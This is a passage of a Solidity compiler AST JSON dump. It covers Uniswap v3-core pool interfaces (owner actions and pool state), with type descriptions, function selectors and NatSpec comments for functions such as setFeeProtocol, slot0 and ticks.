									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1952,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "915:2:6"
									},
									"returnParameters": {
										"id": 1955,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1954,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1956,
												"src": "941:6:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1953,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "941:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "940:8:6"
									},
									"scope": 1969,
									"src": "903:46:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1957,
										"nodeType": "StructuredDocumentation",
										"src": "955:358:6",
										"text": "@notice The pool tick spacing\n @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n This value is an int24 to avoid casting even though it is always positive.\n @return The tick spacing"
									},
									"functionSelector": "d0c93a7c",
									"id": 1962,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickSpacing",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1958,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1338:2:6"
									},
									"returnParameters": {
										"id": 1961,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1960,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1962,
												"src": "1364:5:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1959,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1364:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1363:7:6"
									},
									"scope": 1969,
									"src": "1318:53:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1963,
										"nodeType": "StructuredDocumentation",
										"src": "1377:363:6",
										"text": "@notice The maximum amount of position liquidity that can use any tick in the range\n @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n @return The max amount of liquidity per tick"
									},
									"functionSelector": "70cf754a",
									"id": 1968,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "maxLiquidityPerTick",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1964,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1773:2:6"
									},
									"returnParameters": {
										"id": 1967,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1966,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1968,
												"src": "1799:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1965,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1799:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1798:9:6"
									},
									"scope": 1969,
									"src": "1745:63:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1970,
							"src": "224:1586:6"
						}
					],
					"src": "45:1766:6"
				},
				"id": 6
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolOwnerActions": [
							1995
						]
					},
					"id": 1996,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1971,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:7"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1972,
								"nodeType": "StructuredDocumentation",
								"src": "71:116:7",
								"text": "@title Permissioned pool actions\n @notice Contains pool methods that may only be called by the factory owner"
							},
							"fullyImplemented": false,
							"id": 1995,
							"linearizedBaseContracts": [
								1995
							],
							"name": "IUniswapV3PoolOwnerActions",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1973,
										"nodeType": "StructuredDocumentation",
										"src": "230:205:7",
										"text": "@notice Set the denominator of the protocol's % share of the fees\n @param feeProtocol0 new protocol fee for token0 of the pool\n @param feeProtocol1 new protocol fee for token1 of the pool"
									},
									"functionSelector": "8206a4d1",
									"id": 1980,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeProtocol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1978,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1975,
												"mutability": "mutable",
												"name": "feeProtocol0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1980,
												"src": "464:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1974,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "464:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1977,
												"mutability": "mutable",
												"name": "feeProtocol1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1980,
												"src": "484:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1976,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "484:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "463:40:7"
									},
									"returnParameters": {
										"id": 1979,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:0:7"
									},
									"scope": 1995,
									"src": "440:73:7",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1981,
										"nodeType": "StructuredDocumentation",
										"src": "519:483:7",
										"text": "@notice Collect the protocol fee accrued to the pool\n @param recipient The address to which collected protocol fees should be sent\n @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n @return amount0 The protocol fee collected in token0\n @return amount1 The protocol fee collected in token1"
									},
									"functionSelector": "85b66729",
									"id": 1994,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collectProtocol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1988,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1983,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1994,
												"src": "1041:17:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1982,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1041:7:7",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1985,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1994,
												"src": "1068:24:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1984,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1068:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1987,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1994,
												"src": "1102:24:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1986,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1102:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1031:101:7"
									},
									"returnParameters": {
										"id": 1993,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1990,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1994,
												"src": "1151:15:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1989,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1151:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1992,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1994,
												"src": "1168:15:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1991,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1168:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1150:34:7"
									},
									"scope": 1995,
									"src": "1007:178:7",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1996,
							"src": "187:1000:7"
						}
					],
					"src": "45:1143:7"
				},
				"id": 7
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolState": [
							2103
						]
					},
					"id": 2104,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1997,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:8"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1998,
								"nodeType": "StructuredDocumentation",
								"src": "71:169:8",
								"text": "@title Pool state that can change\n @notice These methods compose the pool's state, and can change with any frequency including multiple times\n per transaction"
							},
							"fullyImplemented": false,
							"id": 2103,
							"linearizedBaseContracts": [
								2103
							],
							"name": "IUniswapV3PoolState",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1999,
										"nodeType": "StructuredDocumentation",
										"src": "276:1140:8",
										"text": "@notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n when accessed externally.\n @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n tick The current tick of the pool, i.e. according to the last tick transition that was run.\n This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n boundary.\n observationIndex The index of the last oracle observation that was written,\n observationCardinality The current maximum number of observations stored in the pool,\n observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n feeProtocol The protocol fee for both tokens of the pool.\n Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n unlocked Whether the pool is currently locked to reentrancy"
									},
									"functionSelector": "3850c7bd",
									"id": 2016,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "slot0",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2000,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1435:2:8"
									},
									"returnParameters": {
										"id": 2015,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2002,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1498:20:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 2001,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "1498:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2004,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1532:10:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 2003,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1532:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2006,
												"mutability": "mutable",
												"name": "observationIndex",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1556:23:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 2005,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1556:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2008,
												"mutability": "mutable",
												"name": "observationCardinality",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1593:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 2007,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1593:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2010,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1636:33:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 2009,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1636:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2012,
												"mutability": "mutable",
												"name": "feeProtocol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1683:17:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 2011,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1683:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2014,
												"mutability": "mutable",
												"name": "unlocked",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2016,
												"src": "1714:13:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2013,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1714:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1484:253:8"
									},
									"scope": 2103,
									"src": "1421:317:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2017,
										"nodeType": "StructuredDocumentation",
										"src": "1744:168:8",
										"text": "@notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "f3058399",
									"id": 2022,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal0X128",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2018,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1946:2:8"
									},
									"returnParameters": {
										"id": 2021,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2020,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2022,
												"src": "1972:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2019,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1972:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1971:9:8"
									},
									"scope": 2103,
									"src": "1917:64:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2023,
										"nodeType": "StructuredDocumentation",
										"src": "1987:168:8",
										"text": "@notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "46141319",
									"id": 2028,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal1X128",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2024,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2189:2:8"
									},
									"returnParameters": {
										"id": 2027,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2026,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2028,
												"src": "2215:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2025,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2215:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2214:9:8"
									},
									"scope": 2103,
									"src": "2160:64:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2029,
										"nodeType": "StructuredDocumentation",
										"src": "2230:147:8",
										"text": "@notice The amounts of token0 and token1 that are owed to the protocol\n @dev Protocol fees will never exceed uint128 max in either token"
									},
									"functionSelector": "1ad8b03b",
									"id": 2036,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "protocolFees",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2030,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2403:2:8"
									},
									"returnParameters": {
										"id": 2035,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2032,
												"mutability": "mutable",
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2036,
												"src": "2429:14:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2031,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2429:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2034,
												"mutability": "mutable",
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2036,
												"src": "2445:14:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2033,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2445:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2428:32:8"
									},
									"scope": 2103,
									"src": "2382:79:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2037,
										"nodeType": "StructuredDocumentation",
										"src": "2467:150:8",
										"text": "@notice The currently in range liquidity available to the pool\n @dev This value has no relationship to the total liquidity across all ticks"
									},
									"functionSelector": "1a686502",
									"id": 2042,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "liquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2038,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2640:2:8"
									},
									"returnParameters": {
										"id": 2041,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2040,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2042,
												"src": "2666:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2039,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2666:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2665:9:8"
									},
									"scope": 2103,
									"src": "2622:53:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2043,
										"nodeType": "StructuredDocumentation",
										"src": "2681:1244:8",
										"text": "@notice Look up information about a specific tick in the pool\n @param tick The tick to look up\n @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n tick upper,\n liquidityNet how much liquidity changes when the pool price crosses the tick,\n feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n secondsOutside the seconds spent on the other side of the tick from the current tick,\n initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n In addition, these values are only relative and must be used only in comparison to previous snapshots for\n a specific position."
									},
									"functionSelector": "f30dba93",
									"id": 2064,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ticks",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2046,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2045,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "3945:10:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 2044,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3945:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3944:12:8"
									},
									"returnParameters": {
										"id": 2063,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2048,
												"mutability": "mutable",
												"name": "liquidityGross",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4017:22:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2047,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "4017:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2050,
												"mutability": "mutable",
												"name": "liquidityNet",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4053:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 2049,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "4053:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2052,
												"mutability": "mutable",
												"name": "feeGrowthOutside0X128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4086:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2051,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4086:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2054,
												"mutability": "mutable",
												"name": "feeGrowthOutside1X128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4129:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2053,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4129:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2056,
												"mutability": "mutable",
												"name": "tickCumulativeOutside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4172:27:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 2055,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "4172:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2058,
												"mutability": "mutable",
												"name": "secondsPerLiquidityOutsideX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4213:38:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 2057,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4213:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2060,
												"mutability": "mutable",
												"name": "secondsOutside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4265:21:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 2059,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "4265:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2062,
												"mutability": "mutable",
												"name": "initialized",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2064,
												"src": "4300:16:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2061,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4300:4:8",
													"typeDescriptions": {
